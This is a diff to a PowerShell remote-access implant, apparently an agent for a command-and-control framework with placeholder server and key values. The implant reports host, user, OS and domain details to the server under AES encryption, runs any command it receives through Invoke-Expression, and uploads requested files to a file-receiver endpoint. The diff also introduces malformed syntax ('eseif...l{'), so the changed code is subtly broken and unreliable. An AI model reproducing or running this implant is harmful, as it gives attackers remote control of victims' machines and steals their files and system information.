@@ -1,54 +1,55 @@
-$interval = OCU_INTERVAL;
-$key = "OCT_KEY";
-function Create-AesManagedObject($key, $IV) {
+$TASK_CHECK_INTERVAL = OCU_INTERVAL;
+$AES_KEY = "OCT_KEY";
+$AES_IV = "OCT_IV"
+
+function Create-AesManagedObject($AES_KEY, $AES_IV) {
     $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
     $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
     $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
     $aesManaged.BlockSize = 128
     $aesManaged.KeySize = 256
-    if ($IV) {
-        if ($IV.getType().Name -eq "String") {
-            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
+    if ($AES_IV) {
+        if ($AES_IV.getType().Name -eq "String") {
+            $aesManaged.IV = [System.Convert]::FromBase64String($AES_IV)
         }
         else {
-            $aesManaged.IV = $IV
+            $aesManaged.IV = $AES_IV
         }
     }
-    if ($key) {
-        if ($key.getType().Name -eq "String") {
-            $aesManaged.Key = [System.Convert]::FromBase64String($key)
+    if ($AES_KEY) {
+        if ($AES_KEY.getType().Name -eq "String") {
+            $aesManaged.Key = [System.Convert]::FromBase64String($AES_KEY)
         }
         else {
-            $aesManaged.Key = $key
+            $aesManaged.Key = $AES_KEY
         }
     }
     $aesManaged
 }
 
-function EncryptCommand($key, $unencryptedString) {
+function EncryptAES($AES_KEY, $AES_IV, $unencryptedString) {
     $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
-    $aesManaged = Create-AesManagedObject $key
+    $aesManaged = Create-AesManagedObject $AES_KEY $AES_IV
     $encryptor = $aesManaged.CreateEncryptor()
     $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
-    [byte[]] $fullData = $aesManaged.IV + $encryptedData
-    [System.Convert]::ToBase64String($fullData)
+    [System.Convert]::ToBase64String($encryptedData)
 }
 
-function DecryptCommand($key, $encryptedStringWithIV) {
-    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
-    $IV = $bytes[0..15]
-    $aesManaged = Create-AesManagedObject $key $IV
+function DecryptAES($AES_KEY, $AES_IV, $cipher) {
+    $bytes = [System.Convert]::FromBase64String($cipher)
+    $aesManaged = Create-AesManagedObject $AES_KEY $AES_IV
     $decryptor = $aesManaged.CreateDecryptor();
-    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
+    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
     [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
 }
+
 
 $progressPreference = 'silentlyContinue';
 $wc = New-Object system.Net.WebClient;
 $wc2 = New-Object system.Net.WebClient;
 $wcr = New-Object system.Net.WebClient;
 $hostname = $env:COMPUTERNAME;
-$he = EncryptCommand $key $hostname
+$he = EncryptAES $AES_KEY $AES_IV $hostname
 $random = -join ((65..90) | Get-Random -Count 5 | % {[char]$_});
 $final_hostname = "$hostname-$random";
 $whoami = $env:USERNAME;
@@ -58,8 +59,8 @@ $domain = (Get-WmiObject Win32_ComputerSystem).Domain;
 
 
 $raw_header = "$final_hostname,$whoami,$os,$pid,$domain";
-$encrypted_header = EncryptCommand $key $raw_header;
-$final_hostname_encrypted = EncryptCommand $key $final_hostname
+$encrypted_header = EncryptAES $AES_KEY $AES_IV $raw_header;
+$final_hostname_encrypted = EncryptAES $AES_KEY $AES_IV $final_hostname
 
 $wch = $wc.headers;
 $wch.add("Authorization", $encrypted_header);
@@ -78,7 +79,7 @@ while($true){
     }
     }
 
-    $final_command = DecryptCommand $key $command_raw
+    $final_command = DecryptAES $AES_KEY $AES_IV $command_raw
     $fc = $final_command.Trim([char]0).Trim([char]1).Trim([char]2).Trim([char]3).Trim([char]4).Trim([char]5).Trim([char]6).Trim([char]7).Trim([char]8).Trim([char]9).Trim([char]10).Trim([char]11).Trim([char]12).Trim([char]13).Trim([char]14).Trim([char]15).Trim([char]16).Trim([char]17).Trim([char]18).Trim([char]19).Trim([char]20).Trim([char]21)
 
     if($fc -eq "False"){
@@ -91,31 +92,47 @@ while($true){
       $ps+= (Get-WinSystemLocale).Name
       $ps+= ((get-date) - (gcim Win32_OperatingSystem).LastBootUpTime).TotalHours
       $ps+= Get-Date -Format "HH:mm(MM/dd/yyyy)"
-      $pst = EncryptCommand $key $ps
+      $pst = EncryptAES $AES_KEY $AES_IV $ps
       $wcrh = $wcr.Headers;
       $wcrh.add("Authorization", $pst);
       $wcrh.add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
       $wcrh.add("App-Logic", $he);
       $wcr.downloadString("OCU_PROTO://SRVHOST/OCT_report");
     }
-    elseif($fc.split(" ")[0] -eq "Download"){
-      $filename = EncryptCommand $key $fc.split("\")[-1]
-      $file_content = Get-Content $fc.split(" ")[1] -Encoding byte
-      #$Bytes = [System.Text.Encoding]::Unicode.GetBytes($file_content);
-      $EncodedText =[Convert]::ToBase64String($file_content);
-      $efc = EncryptCommand $key $EncodedText;
-      $wc3 = new-object net.WebClient;
-      $wc3h = $wc3.Headers;
-      $wc3h.add("Content-Type", "application/x-www-form-urlencoded");
-      $wc3.UploadString("OCU_PROTO://SRVHOST/OCT_file_receiver", "fn=$filename&token=$efc");
-    }else{
+    eseif($fc.split(" ")[0] -eq "Download")l{
+        $filename = EncryptAES $AES_KEY $AES_IV $fc.split("\")[-1]
+        $file_content = Get-Content $fc.split(" ")[1] -Encoding byte
+        #$Bytes = [System.Text.Encoding]::Unicode.GetBytes($file_content);
+        $EncodedText = [Convert]::ToBase64String($file_content);
+        $efc = EncryptAES $AES_KEY $AES_IV $EncodedText;
+        $wc3 = new-object net.WebClient;
+        $wc3h = $wc3.Headers;
+        $wc3h.add("Content-Type", "application/x-www-form-urlencoded");
+        $wc3.UploadString("OCU_PROTO://SRVHOST/OCT_file_receiver", "fn=$filename&token=$efc");
+    }
+    eseif($fc.split(" ")[0] -eq "reset-ps")l{
+        try{
+        $ec = Invoke-Expression ("Remove-Variable * -ErrorAction SilentlyContinue") | Out-String;
+        $ec = "OK";
+        }
+        catch{
+        $ec = $Error[0] | Out-String;
+        }
+        $EncodedText = EncryptAES $AES_KEY $AES_IV $ec;
+        $wc3 = New-Object system.Net.WebClient;
+        $wc3.Headers["App-Logic"] = $final_hostname_encrypted;
+        $wc3.Headers["Authorization"] = $EncodedText;
+        $wc3.Headers["Session"] = $command_raw;
+        $wc3.downloadString("OCU_PROTO://SRVHOST/OCTRECV");
+    }
+    else{
       try{
         $ec = Invoke-Expression ($fc) | Out-String;
         }
         catch{
         $ec = $Error[0] | Out-String;
         }
-        $EncodedText = EncryptCommand $key $ec;
+        $EncodedText = EncryptAES $AES_KEY $AES_IV $ec;
         $wc3 = New-Object system.Net.WebClient;
         $wc3.Headers["App-Logic"] = $final_hostname_encrypted;
         $wc3.Headers["Authorization"] = $EncodedText;
@@ -124,5 +141,5 @@ while($true){
 
     }
 
-    sleep $interval;
+    sleep $TASK_CHECK_INTERVAL;
     }
